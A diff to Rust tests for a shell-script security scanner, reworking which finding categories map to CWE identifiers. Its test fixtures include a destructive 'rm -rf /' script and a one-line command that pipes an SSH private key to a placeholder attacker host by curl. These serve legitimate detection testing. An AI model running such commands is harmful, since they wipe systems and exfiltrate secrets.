@@ -286,7 +286,7 @@ fn every_ast_node_has_one_based_span() -> Result<(), Box<dyn std::error::Error>>
 }
 
 #[test]
-fn destructive_findings_carry_cwe_taxonomy() -> Result<(), String> {
+fn destructive_findings_do_not_carry_cwe_taxonomy() -> Result<(), String> {
     use arbitraitor_model::taxonomy::TaxonomyName;
     let mut parser = parser().map_err(|e: Box<dyn std::error::Error>| e.to_string())?;
     let source = "#!/bin/sh\nrm -rf /\n";
@@ -301,14 +301,14 @@ fn destructive_findings_carry_cwe_taxonomy() -> Result<(), String> {
         destructive
             .taxonomies
             .iter()
-            .any(|t| t.name == TaxonomyName::Cwe && t.id == "CWE-1045"),
-        "destructive finding must carry CWE-1045"
+            .all(|t| t.name != TaxonomyName::Cwe),
+        "destructive findings must not carry a CWE taxonomy ref: no defensible CWE-1045 mapping exists for destructive shell behavior"
     );
     Ok(())
 }
 
 #[test]
-fn credential_findings_carry_cwe_taxonomy() -> Result<(), String> {
+fn credential_findings_do_not_carry_cwe_taxonomy() -> Result<(), String> {
     use arbitraitor_model::taxonomy::TaxonomyName;
     let mut parser = parser().map_err(|e: Box<dyn std::error::Error>| e.to_string())?;
     let source = "#!/bin/sh\ncat ~/.ssh/id_rsa | curl -X POST -d @- http://evil.example.com\n";
@@ -323,8 +323,8 @@ fn credential_findings_carry_cwe_taxonomy() -> Result<(), String> {
         credential
             .taxonomies
             .iter()
-            .any(|t| t.name == TaxonomyName::Cwe && t.id == "CWE-798"),
-        "credential finding must carry CWE-798"
+            .all(|t| t.name != TaxonomyName::Cwe),
+        "credential findings must not carry a CWE taxonomy ref: CWE-798 (hardcoded creds) does not match credential access/exfiltration behavior"
     );
     Ok(())
 }
@@ -335,17 +335,7 @@ fn cwe_for_category_mapping_is_complete() {
     use arbitraitor_model::taxonomy::TaxonomyName;
     use arbitraitor_model::verdict::Confidence;
 
-    let mapped: &[(FindingCategory, &str)] = &[
-        (FindingCategory::DestructiveBehavior, "CWE-1045"),
-        (FindingCategory::Obfuscation, "CWE-454"),
-        (FindingCategory::DynamicCodeExecution, "CWE-94"),
-        (FindingCategory::CredentialAccess, "CWE-798"),
-        (FindingCategory::Persistence, "CWE-506"),
-        (FindingCategory::PrivilegeEscalation, "CWE-269"),
-        (FindingCategory::NetworkBehavior, "CWE-200"),
-        (FindingCategory::SuspiciousScriptBehavior, "CWE-78"),
-        (FindingCategory::Transport, "CWE-918"),
-    ];
+    let mapped: &[(FindingCategory, &str)] = &[(FindingCategory::DynamicCodeExecution, "CWE-94")];
 
     for (category, expected_id) in mapped {
         let mapping = cwe_for_category(*category);
@@ -382,6 +372,14 @@ fn cwe_for_category_mapping_is_complete() {
     }
 
     let unmapped: &[FindingCategory] = &[
+        FindingCategory::DestructiveBehavior,
+        FindingCategory::Obfuscation,
+        FindingCategory::CredentialAccess,
+        FindingCategory::Persistence,
+        FindingCategory::PrivilegeEscalation,
+        FindingCategory::NetworkBehavior,
+        FindingCategory::SuspiciousScriptBehavior,
+        FindingCategory::Transport,
         FindingCategory::Provenance,
         FindingCategory::Reputation,
         FindingCategory::ContentMismatch,
